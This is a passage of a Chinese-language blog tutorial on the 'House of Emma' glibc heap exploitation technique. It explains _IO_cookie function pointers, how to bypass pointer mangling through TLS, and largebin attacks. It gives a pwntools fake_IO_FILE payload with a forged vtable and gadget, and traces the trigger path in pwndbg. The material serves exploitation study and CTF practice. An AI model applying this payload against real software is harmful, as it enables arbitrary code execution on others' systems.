</span></span><br><span class="line">  PTR_DEMANGLE (read_cb); <span class="comment">/* PTR_DEMANGLE保护 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb); <span class="comment">/* PTR_DEMANGLE保护 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb); <span class="comment">/* PTR_DEMANGLE保护 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">	   || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">	       == <span class="number">-1</span>)</span><br><span class="line">	   || offset == (<span class="keyword">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">	  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb); <span class="comment">/* PTR_DEMANGLE保护 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上面这些函数的函数指针来源于_IO_cookie_file 结构体：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span> </span><br><span class="line">  <span class="keyword">void</span> *__cookie;</span><br><span class="line">  <span class="keyword">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">cookie_read_function_t</span> *read;		<span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="keyword">cookie_write_function_t</span> *write;	<span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="keyword">cookie_seek_function_t</span> *seek;		<span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="keyword">cookie_close_function_t</span> *close;	<span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="keyword">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>结构体 <code>_IO_cookie_file</code> 可以直接在 GDB 中打印</li>
-<li>我们可以伪造整个 <code>_IO_cookie_io_functions_t</code> 结构体，把其当做一个类似于 <code>__free_hook</code> 的 Hook 来利用</li>
-</ul>
-<p>在此之前我们需要绕过 PTR_DEMANGLE：（指针加密）</p>
-<ul>
-<li>指针加密是一种 glibc 安全功能，旨在增加攻击者在 glibc 结构中操纵指针（特别是函数指针）的难度（此功能也称为“指针重整”或“指针保护”）</li>
-<li>glibc 端口可以通过实现两个宏来支持指针加密：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>__pointer_chk_guard</code> 是在 TLS 中的一个值（在 GDB 中打印 <code>__pointer_chk_guard_local</code> 就可以找到）</li>
-<li>将其 ROR 移位11位后（右移11位），再和原指针异或 </li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00007ffff7e0d7b0</span> &lt;+<span class="number">0</span>&gt;:     endbr64</span><br><span class="line"><span class="number">0x00007ffff7e0d7b4</span> &lt;+<span class="number">4</span>&gt;:     mov    rax,QWORD PTR [rdi+<span class="number">0xe8</span>]</span><br><span class="line"><span class="number">0x00007ffff7e0d7bb</span> &lt;+<span class="number">11</span>&gt;:    ror    rax,<span class="number">0x11</span></span><br><span class="line"><span class="number">0x00007ffff7e0d7bf</span> &lt;+<span class="number">15</span>&gt;:    <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>[FS] 寄存器指向当前活动线程的 TLS 结构（线程结构），而 <code>fs:0x30</code> 处的值是普通“加密”算法的“密钥” </li>
-</ul>
-<p>应对措施有：</p>
-<ul>
-<li>可以将这个值泄露出来</li>
-<li>也可以修改 TLS 中的这个值</li>
-</ul>
-<p>这样一来就可以伪造 <code>read_cb</code> 函数指针的值（伪造整个 <code>_IO_cookie_io_functions_t</code> 结构体），从而实现任意代码执行的目的</p>
-<h2 id="知识补充：TLS-简析"><a href="#知识补充：TLS-简析" class="headerlink" title="知识补充：TLS 简析"></a>知识补充：TLS 简析</h2><p>TLS (Thread Local Storage) 是为了多线程考虑其线程本身需要维持一些状态而设置的一种机制，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性</p>
-<ul>
-<li>TLS 全称为 Thread Local Storage，即线程本地存储：<ul>
-<li>在单线程模式下，所有整个程序生命周期的变量都是只有一份，那是因为只是一个执行单元</li>
-<li>在多线程模式下，有些变量需要支持每个线程独享一份的功能，这种 <strong>每线程独享的变量</strong> 放到 <strong>每个线程专有的存储区域</strong> ，所以称为线程本地存储（Thread Local Storage）或者线程私有数据（Thread Specific Data）</li>
-<li>案例：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/142418922">Thread Local Storage（线程局部存储）TLS - 知乎</a> </li>
-</ul>
-</li>
-<li>[FS] 寄存器指向当前活动线程的 TLS 结构（线程结构），而 <code>fs:0x30</code> 处的值是普通“加密”算法的“密钥” </li>
-</ul>
-<p>接下来我们就在 GDB 中看一看 TLS，打印 <code>__pointer_chk_guard_local</code> </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __pointer_chk_guard_local</span><br><span class="line">$<span class="number">2</span> = <span class="number">16360226482506262321</span></span><br><span class="line">pwndbg&gt; p &amp;__pointer_chk_guard_local</span><br><span class="line">$<span class="number">3</span> = (<span class="keyword">uintptr_t</span> *) <span class="number">0x7f62ce3c9c10</span> &lt;__pointer_chk_guard_local&gt;</span><br></pre></td></tr></table></figure>
-<p>搜索 <code>__pointer_chk_guard_local</code> 就可以进入 TLS：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0xe30b334e3eb96731</span> <span class="comment">/* 搜索__pointer_chk_guard_local */</span></span><br><span class="line">[anon_7f62ce192] <span class="number">0x7f62ce192770</span> <span class="number">0xe30b334e3eb96731</span></span><br><span class="line">ld.so           <span class="number">0x7f62ce3c9c10</span> <span class="number">0xe30b334e3eb96731</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fff2baa6091</span> <span class="number">0xe30b334e3eb96731</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7f62ce192770</span><span class="number">-0x30</span> <span class="comment">/* 打印TLS */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f62ce192740</span> ◂— <span class="number">0x7f62ce192740</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f62ce192748</span> —▸ <span class="number">0x7f62ce193160</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f62ce192750</span> —▸ <span class="number">0x7f62ce192740</span> ◂— <span class="number">0x7f62ce192740</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f62ce192758</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f62ce192760</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f62ce192768</span> ◂— <span class="number">0xa863990dc41ad000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f62ce192770</span> ◂— <span class="number">0xe30b334e3eb96731</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f62ce192778</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>像 <code>canary</code>、<code>tcache struct ptr</code>、<code>key</code> 这些值都保存在 TLS 中</li>
-<li>在 TLS:[0x300] 的位置有 stack_addr，有时也可以进行利用</li>
-</ul>
-<h2 id="House-Of-Emma-利用姿势"><a href="#House-Of-Emma-利用姿势" class="headerlink" title="House Of Emma 利用姿势"></a>House Of Emma 利用姿势</h2><p>先用两个 largebin attack 分别把 <code>__pointer_chk_guard_local</code> 和 <code>stderr</code> 控制为已知 heap 地址，然后利用 House Of Kiwi 中的方法，使 top chunk 不足以申请从而调用 <code>sysmalloc</code></p>
-<p>其中在 <code>stderr</code> 中的 fake_IO_FILE 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE += p64(srop_addr)  <span class="comment"># rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + <span class="number">0x22a0</span>), <span class="number">0x11</span>))</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得我们可以在一定的范围内对 vtable 表的起始位置进行偏移，使其我们可以通过偏移来调用在 vtable 表中的任意函数</li>
-<li>这里对 vtable 进行偏移，使其可以调用 <code>_IO_cookie_write</code> 函数</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (struct _IO_cookie_file)*(<span class="number">0x562b7f47b2a0</span>)</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  __fp = &#123;</span><br><span class="line">    file = &#123;</span><br><span class="line">      _flags = <span class="number">8208</span>,</span><br><span class="line">      _IO_read_ptr = <span class="number">0x421</span> &lt;error: Cannot access memory at address <span class="number">0x421</span>&gt;,</span><br><span class="line">      _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">      _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">      _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">      _IO_write_ptr = <span class="number">0xffffffffffffffff</span> &lt;error: Cannot access memory at address <span class="number">0xffffffffffffffff</span>&gt;,</span><br><span class="line">      _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">      _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">      _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">      _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">      _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">      _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">      _markers = <span class="number">0x0</span>,</span><br><span class="line">      _chain = <span class="number">0x0</span>,</span><br><span class="line">      _fileno = <span class="number">0</span>,</span><br><span class="line">      _flags2 = <span class="number">0</span>,</span><br><span class="line">      _old_offset = <span class="number">0</span>,</span><br><span class="line">      _cur_column = <span class="number">0</span>,</span><br><span class="line">      _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">      _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">      _lock = <span class="number">0x562b7f479000</span>,</span><br><span class="line">      _offset = <span class="number">0</span>,</span><br><span class="line">      _codecvt = <span class="number">0x0</span>,</span><br><span class="line">      _wide_data = <span class="number">0x0</span>,</span><br><span class="line">      _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">      _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">      __pad5 = <span class="number">0</span>,</span><br><span class="line">      _mode = <span class="number">-1</span>,</span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">    &#125;,</span><br><span class="line">    vtable = <span class="number">0x7fc2360f4b20</span> &lt;_IO_cookie_jumps+<span class="number">64</span>&gt; <span class="comment">/* 这是为了调用_IO_cookie_write */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  __cookie = <span class="number">0x562b7f47baf0</span>,</span><br><span class="line">  __io_functions = &#123;</span><br><span class="line">    read = <span class="number">0x0</span>,</span><br><span class="line">    write = <span class="number">0x53d2928785000000</span>, <span class="comment">/* 已经进行了PTR_DEMANGLE加密 */</span></span><br><span class="line">    seek = <span class="number">0x0</span>,</span><br><span class="line">    close = <span class="number">0x0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来我们来跟进一下 House Of Emma 的触发流程：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ff1c80e5bb3</span> &lt;_int_malloc+<span class="number">3539</span>&gt;    call   sysmalloc                &lt;sysmalloc&gt;</span><br><span class="line">       rdi: <span class="number">0x460</span></span><br><span class="line">       rsi: <span class="number">0x7ff1c823ec60</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>因为我们修改了 top chunk-&gt;P，所以触发 <code>__malloc_assert</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ff1c80e4cb2</span> &lt;sysmalloc+<span class="number">1714</span>&gt;    call   __malloc_assert                &lt;__malloc_assert&gt;</span><br><span class="line">       rdi: <span class="number">0x7ff1c8206b00</span> ◂— <span class="string">&#x27;(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27;</span></span><br><span class="line">       rsi: <span class="number">0x7ff1c820169d</span> ◂— <span class="string">&#x27;malloc.c&#x27;</span></span><br><span class="line">       rdx: <span class="number">0x9d4</span></span><br><span class="line">       rcx: <span class="number">0x7ff1c8207360</span> (__PRETTY_FUNCTION__<span class="number">.12920</span>) ◂— <span class="string">&#x27;sysmalloc&#x27;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入函数 <code>__fxprintf</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ff1c80e295d</span> &lt;__malloc_assert+<span class="number">61</span>&gt;    call   __fxprintf                &lt;__fxprintf&gt;</span><br><span class="line">       rdi: <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7ff1c8206360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入函数 <code>__vfxprintf</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ff1c80c3d68</span> &lt;__fxprintf+<span class="number">136</span>&gt;           call   __vfxprintf                &lt;__vfxprintf&gt;</span><br><span class="line">       rdi: <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7ff1c8206360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x7ffc0fbb0e38</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入函数 <code>locked_vfxprintf</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fc235f78c50</span> &lt;__vfxprintf+<span class="number">80</span>&gt;     call   locked_vfxprintf                &lt;locked_vfxprintf&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47b2a0</span> ◂— <span class="number">0x2010</span> <span class="comment">/* stderr =&gt; largebin attack =&gt; 可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x7ffdcb2a62c8</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入函数 <code>__vfprintf_internal</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fc235f78b63</span> &lt;locked_vfxprintf+<span class="number">291</span>&gt;    call   __vfprintf_internal                &lt;__vfprintf_internal&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47b2a0</span> ◂— <span class="number">0x2010</span> <span class="comment">/* stderr =&gt; largebin attack =&gt; 可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x7ffdcb2a62c8</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入函数 <code>_IO_cookie_write</code>：（前面伪造了 vtable，这里才可以调用 <code>_IO_cookie_write</code>）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fc235f70015</span> &lt;__vfprintf_internal+<span class="number">261</span>&gt;    call   qword ptr [rbx + <span class="number">0x38</span>]        &lt;_IO_cookie_write&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47b2a0</span> ◂— <span class="number">0x2010</span> <span class="comment">/* stderr =&gt; largebin attack =&gt; 可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 <code>_IO_cookie_write</code> 中有一个 <code>call rax</code> （<code>rax</code> 需要经过 PTR_DEMANGLE 解密）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7fc235f79a16</span> &lt;_IO_cookie_write+<span class="number">38</span>&gt;    mov    rbp, rdx</span><br><span class="line">  <span class="number">0x7fc235f79a19</span> &lt;_IO_cookie_write+<span class="number">41</span>&gt;    mov    rdi, qword ptr [rdi + <span class="number">0xe0</span>]</span><br><span class="line">► <span class="number">0x7fc235f79a20</span> &lt;_IO_cookie_write+<span class="number">48</span>&gt;    call   rax                           &lt;getkeyserv_handle+<span class="number">528</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47baf0</span> ◂— <span class="number">0x0</span> <span class="comment">/* __cookie:可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span>                         </span><br></pre></td></tr></table></figure>
-<ul>
-<li>由于整个 <code>_IO_cookie_io_functions_t</code> 已经被我们伪造（其中 <code>_IO_cookie_io_functions_t-&gt;write</code> 被伪造为一个特殊的 gadget）</li>
-<li>利用这个 gadget 可以获取位于 [RDI] 中的 <code>__cookie</code>（可控 heap 空间），并且调用位于 <code>__cookie+0x20</code> 处的函数</li>
-</ul>
